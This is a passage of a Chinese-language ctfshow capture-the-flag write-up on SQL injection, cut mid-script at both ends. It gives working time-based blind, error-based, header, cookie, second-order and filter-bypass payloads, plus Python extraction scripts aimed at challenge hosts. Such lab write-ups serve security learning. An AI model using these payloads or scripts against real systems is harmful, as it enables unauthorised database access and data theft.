information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),0)&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),0)&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagbab&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),0)&#x27;</span><br>            payload = <span class="hljs-string">f&#x27;if(ascii(substr((select flag4sa from ctfshow.flagbab),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(1),0)&#x27;</span><br><br>            data = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">f&#x27;admin&quot;) and <span class="hljs-subst">&#123;payload&#125;</span>#&#x27;</span>,<br>                <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>            &#125;<br>            <span class="hljs-keyword">try</span>:<br>                r = requests.post(url=url, data=data,timeout=<span class="hljs-number">0.5</span>)<br>                high = mid<br>            <span class="hljs-keyword">except</span>:<br>                low = mid + <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="WEB-533-POST注入-报错注入"><a href="#WEB-533-POST注入-报错注入" class="headerlink" title="WEB-533-POST注入&amp;报错注入"></a>WEB-533-POST注入&amp;报错注入</h2><p>字符型注入，闭合方式为<code>&#39;</code><br><strong>区别：有数据库报错处理判断标准</strong></p><p>使用<strong>报错注入</strong>：</p><p>（1）、查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select (table_name) from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),0x7e),1)#<br></code></pre></td></tr></table></figure><p>（2）、查看数据库表中的列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">uname=admin&amp;passwd=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;),0x7e),1)#</span><br></code></pre></td></tr></table></figure><p>（3）、查看flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">uname=admin&amp;passwd=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select (flag4) from ctfshow.flag),0x7e),1)#</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag),0x7e),1)#<br></code></pre></td></tr></table></figure><h2 id="WEB-534-UA头注入-报错注入"><a href="#WEB-534-UA头注入-报错注入" class="headerlink" title="WEB-534-UA头注入&amp;报错注入"></a>WEB-534-UA头注入&amp;报错注入</h2><p>输入admin、admin后会显示出UA头信息，故判断为UA头注入</p><p>在User-Agent使用报错注入：</p><p>（1）、查看所有的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">User-Agent: &#x27; and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.tables),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><p>【注意】这里的闭合是单引号，但是闭合方式不能在最后加个<code>--空格</code>或者<code>--+</code>或者<code>#</code>，只能利用好闭合的单引号，在最后加一个<code>&#39;1&#39;=&#39;1</code>。</p><p>（2）、查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">User-Agent: &#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><p>（3）、查看数据库中表的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">User-Agent: &#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><p>（4）、查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">User-Agent: &#x27; and extractvalue(1,concat(0x7e,(select flag4 from ctfshow.flag),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">User-Agent: &#x27; and extractvalue(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><h2 id="WEB-535-Rerferer注入-报错注入"><a href="#WEB-535-Rerferer注入-报错注入" class="headerlink" title="WEB-535-Rerferer注入&amp;报错注入"></a>WEB-535-Rerferer注入&amp;报错注入</h2><p>输入admin、admin后会显示出rerferer信息，故判断为Rerferer注入</p><p>在Referer使用报错注入即可</p><p>同上述UA头注入一致</p><h2 id="WEB-536-Cookie注入-报错注入"><a href="#WEB-536-Cookie注入-报错注入" class="headerlink" title="WEB-536-Cookie注入&amp;报错注入"></a>WEB-536-Cookie注入&amp;报错注入</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/typora/202309131122091.png" alt="image-20230913112254924"></p><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/typora/202309131123763.png" alt="image-20230913112341605"></p><h2 id="WEB-537-Cookie注入-报错注入-base64注入"><a href="#WEB-537-Cookie注入-报错注入-base64注入" class="headerlink" title="WEB-537-Cookie注入&amp;报错注入&amp;base64注入"></a>WEB-537-Cookie注入&amp;报错注入&amp;base64注入</h2><p>与上一题一致，只不过Cookie是经过base64加密,闭合方式<code>&#39;</code></p><p>注入时将payload经过base64加密即可</p><p>（1）、查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.tables),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/typora/202309131418221.png" alt="image-20230913141838840"></p><p>（2）、查看数据库表中的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/typora/202309131419253.png" alt="image-20230913141950104"></p><p>（3）、查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; and extractvalue(1,concat(0x7e,(select flag4 from ctfshow.flag),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; and extractvalue(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag),0x7e)) and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/typora/202309131421388.png" alt="image-20230913142120065"></p><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/typora/202309131422293.png" alt="image-20230913142210938"></p><h2 id="WEB-538-Cookie注入-报错注入-base64注入"><a href="#WEB-538-Cookie注入-报错注入-base64注入" class="headerlink" title="WEB-538-Cookie注入&amp;报错注入&amp;base64注入"></a>WEB-538-Cookie注入&amp;报错注入&amp;base64注入</h2><p>与上一题一致，只不过闭合方式为<code>&quot;</code></p><p>（1）查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),0x7e),1)#<br></code></pre></td></tr></table></figure><p>（2）、查看数据库表中的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e),1)#<br></code></pre></td></tr></table></figure><p>（3）、查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; and updatexml(1,concat(0x7e,(select flag4 from ctfshow.flag),0x7e),1)#<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; and updatexml(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag),0x7e),1)#<br></code></pre></td></tr></table></figure><h2 id="WEB-539-联合注入-过滤字符-注释符"><a href="#WEB-539-联合注入-过滤字符-注释符" class="headerlink" title="WEB-539-联合注入&amp;过滤字符-注释符"></a>WEB-539-联合注入&amp;过滤字符-注释符</h2><p><strong>过滤方式：注释符被过滤</strong></p><p><strong>绕过方式：使用%00进行过滤</strong></p><p>测试闭合方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&#x27;               报错near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1<br>?id=1&#x27; --+           报错near &#x27;&#x27; LIMIT 0,1&#x27; at line 1<br>?id=1&#x27; #             报错near &#x27;&#x27; LIMIT 0,1&#x27; at line 1<br>?id=1&#x27;&#x27;              登录成功<br>?id=-1&#x27; or &#x27;1&#x27;=&#x27;1    登录成功<br><br>可以判断这里闭合是单引号，而且注释符被过滤！<br></code></pre></td></tr></table></figure><p>测一下回显位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&#x27; union select 1&#x27;             报错<br>?id=1&#x27; union select 1,2&#x27;           报错<br>?id=1&#x27; union select 1,2,3&#x27;         正常<br>?id=1&#x27; union select 1,2,3,4&#x27;       报错<br><br>判断回显位有三个。<br>或使用：?id=1&#x27; union select 1,2,3; %00<br></code></pre></td></tr></table></figure><p>（1）、查看数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata;%00<br>或者<br>?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3&#x27;<br></code></pre></td></tr></table></figure><p>（2）、查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;ctfshow&quot;;%00<br>或者<br>?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),3&#x27;<br></code></pre></td></tr></table></figure><p>（3）、查看数据库中表的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flag&quot;;%00<br>或者<br>?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),3&#x27;<br></code></pre></td></tr></table></figure><p>（4）、查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,flag4,3 from ctfshow.flag;%00<br>或者<br>?id=-1&#x27; union select 1,(select flag4 from ctfshow.flag),3&#x27;<br></code></pre></td></tr></table></figure><h2 id="WEB-540-二次注入"><a href="#WEB-540-二次注入" class="headerlink" title="WEB-540-二次注入"></a>WEB-540-二次注入</h2><p>（1）、先注册一个<code>admin&#39;#</code> 的账号，密码是<code>123456</code></p><p>注册用户时，添加语句为：（login_create.php）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;<br></code></pre></td></tr></table></figure><p>（2）、登录该账号后进行密码修改，修改为<code>111111</code></p><p>修改密码时，修改语句为：（pass_change.php）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;<br></code></pre></td></tr></table></figure><p>带入数据后即为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">$sql = &quot;UPDATE users SET PASSWORD=&#x27;111111&#x27; where username=&#x27;admin&#x27; #&#x27; and password=&#x27;admin原来的密码&#x27; &quot;;<br></code></pre></td></tr></table></figure><p>（3）、使用脚本进行盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>session = requests.session()<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),0)&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.7),0)&#x27;</span><br>        payload = <span class="hljs-string">f&#x27;if(ascii(substr((select/**/group_concat(flag4)from(ctfshow.flag)),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.6),0)&#x27;</span><br>        username = <span class="hljs-string">f&quot;admin&#x27; and <span class="hljs-subst">&#123;payload&#125;</span> or &#x27;1&#x27;=&#x27;1&quot;</span><br>        url1 = <span class="hljs-string">&#x27;http://6d02fe4f-4cfd-4664-8486-8a5a380c2ee3.challenge.ctf.show:8080/login_create.php&#x27;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: username,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>            <span class="hljs-string">&#x27;re_password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>            <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;Register&#x27;</span><br>        &#125;<br>        r = session.post(url1, data=data)<br>        url2 = <span class="hljs-string">&#x27;http://6d02fe4f-4cfd-4664-8486-8a5a380c2ee3.challenge.ctf.show:8080/login.php&#x27;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;login_user&#x27;</span>: username,<br>            <span class="hljs-string">&#x27;login_password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>            <span class="hljs-string">&#x27;mysubmit&#x27;</span>: <span class="hljs-string">&#x27;Login&#x27;</span>,<br>        &#125;<br>        r = session.post(url2, data=data)<br>        url3 = <span class="hljs-string">&#x27;http://6d02fe4f-4cfd-4664-8486-8a5a380c2ee3.challenge.ctf.show:8080/pass_change.php&#x27;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;current_password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,<br>            <span class="hljs-string">&#x27;re_password&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,<br>            <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;Reset&#x27;</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            r = session.post(url3,data=data,timeout=<span class="hljs-number">0.5</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span>:<br>            head = mid + <span class="hljs-number">1</span><br><br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="WEB-541-过滤字符-or-and"><a href="#WEB-541-过滤字符-or-and" class="headerlink" title="WEB-541-过滤字符-or&amp;and"></a>WEB-541-过滤字符-<code>or</code>&amp;<code>and</code></h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p><strong>绕过方法：对<code>or</code>和<code>and</code>进行双写绕过</strong></p><p>使用联合注入的方式</p><p>（1）、查看有多少列回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id=1&#x27; oorrder by 3--+<br></code></pre></td></tr></table></figure><p>（2）、查看所有数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id=-1&#x27;union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata--+<br></code></pre></td></tr></table></figure><p>（3）、查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id=-1&#x27; union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#x27;ctfshow&#x27;--+<br></code></pre></td></tr></table></figure><p>（4）、查看数据库中表的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id=-1&#x27; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&#x27;flags&#x27;--+<br></code></pre></td></tr></table></figure><p>（5）、查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id=-1&#x27; union select 1,flag4s,3 from ctfshow.flags--+<br></code></pre></td></tr></table></figure><h2 id="WEB-542-过滤字符-or-and"><a href="#WEB-542-过滤字符-or-and" class="headerlink" title="WEB-542-过滤字符-or&amp;and"></a>WEB-542-过滤字符-<code>or</code>&amp;<code>and</code></h2><p>数字型注入</p><p><strong>绕过方法：对<code>or</code>和<code>and</code>进行双写绕过</strong></p><p>使用联合注入的方式，同上述一致</p><h2 id="WEB-543-过滤字符-or-and-空格"><a href="#WEB-543-过滤字符-or-and-空格" class="headerlink" title="WEB-543-过滤字符-or&amp;and&amp;空格"></a>WEB-543-过滤字符-<code>or</code>&amp;<code>and</code>&amp;<code>空格</code></h2><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//过滤替换or</span><br>    <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-comment">//过滤替换and</span><br>    <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-comment">//过滤替换/*</span><br>    <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-comment">//过滤替换--   （注释符一部分）</span><br>    <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-comment">//过滤替换#    （注释符）</span><br>    <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-comment">//过滤替换\s      </span><br>    <span class="hljs-comment">//\s: 匹配一个空格符 等价于【\n\r\f\v\t】</span><br>    <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-comment">//过滤替换 /\</span><br>    <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>常规代替空格的字符：</strong></p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TAB 键（水平）<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TAB 键（垂直）<br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页<br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return 功能<br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格<br></code></pre></td></tr></table></figure><p><strong>空格的作用还可以使用括号代替，一个比较不常用的注释符<code>;%00</code></strong></p><p><strong>使用报错注入和使用括号代替空格：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">//顺序读取<br>?id=1&#x27;||updatexml(1,concat(0x3d,(select(group_concat(flag4s))from(ctfshow.flags))),3)||&#x27;1&#x27;=&#x27;1<br><br>//读取右边20个字符<br>?id=1&#x27;||updatexml(1,concat(0x3d,(select(right(flag4s,20))from(ctfshow.flags))),3)||&#x27;1&#x27;=&#x27;1<br><br>//逆序读取<br>?id=1&#x27;||updatexml(1,concat(0x3d,(select(reverse(group_concat(flag4s)))from(ctfshow.flags))),3)||&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><h2 id="WEB-544-过滤字符-or-and-空格"><a href="#WEB-544-过滤字符-or-and-空格" class="headerlink" title="WEB-544-过滤字符-or&amp;and&amp;空格"></a>WEB-544-过滤字符-<code>or</code>&amp;<code>and</code>&amp;<code>空格</code></h2><p>字符型注入，闭合是单引号+括号<code>&#39;)&#39;</code></p><p><strong>区别：不显示具体报错了，导致无法使用报错注入。</strong></p><p>使用盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://f68dd94f-bb45-4bcd-aba2-fdc772c17831.challenge.ctf.show/&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>        payload = <span class="hljs-string">f&#x27;if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">f&quot;100&#x27;)||<span class="hljs-subst">&#123;payload&#125;</span>||(&#x27;0&quot;</span><br>        &#125;<br>        r = requests.get(url,params=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Dumb&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br><br>    <span class="hljs-keyword">if</span> head 